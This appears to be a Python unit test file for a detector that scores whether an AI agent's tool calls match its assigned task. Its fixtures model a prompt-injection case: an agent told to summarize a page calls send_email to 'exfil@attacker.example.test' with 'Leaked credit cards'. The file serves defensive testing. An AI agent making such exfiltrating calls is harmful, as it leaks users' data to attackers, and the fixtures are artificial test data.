"""
Unit tests for Intent Consistency Scorer and Feature Builder
Verifies Section 6.4 and Section 9 requirements.
"""

import unittest
from ml.detectors.intent.detector import IntentConsistencyDetector
from ml.detectors.intent.features import check_external_destination, check_tool_allowed, extract_intent_features
from ml.interfaces import DetectorOutput, ToolCallEvent


class TestIntentScorer(unittest.TestCase):

    def test_external_destination_detector(self):
        """Checks external domain recognition."""
        # Internal NexusCorp URL
        self.assertEqual(check_external_destination("read_webpage", {"url": "https://docs.nexuscorp.example.test/portal/guide-1.html"}), 0.0)
        # Malicious sink
        self.assertEqual(check_external_destination("send_email", {"to": "exfil@attacker.example.test"}), 1.0)

    def test_tool_allowed_heuristics(self):
        """Checks tool compatibility with task descriptions."""
        # Summarize webpage
        self.assertEqual(check_tool_allowed("Summarize corporate web page", "read_webpage"), 1.0)
        # Summarize webpage calling send_email (disallowed)
        self.assertEqual(check_tool_allowed("Summarize corporate web page", "send_email"), 0.0)

    def test_intent_detector_contract(self):
        """Checks IntentConsistencyDetector evaluates ToolCallEvent and outputs DetectorOutput."""
        detector = IntentConsistencyDetector()
        event = ToolCallEvent(
            session_id="intent_test_sess",
            step=1,
            tool="send_email",
            sensitivity="high",
            arguments={"to": "exfil@attacker.example.test", "body": "Leaked credit cards"},
            task_text="Fetch and summarize news page",
            taint=["seg_1"],
        )
        res = detector.score(event)
        self.assertIsInstance(res, DetectorOutput)
        self.assertEqual(res.detector, "intent")
        self.assertGreaterEqual(res.score, 0.0)
        self.assertLessEqual(res.score, 1.0)
        self.assertIn("task_action_cosine_sim", res.evidence)


if __name__ == "__main__":
    unittest.main()
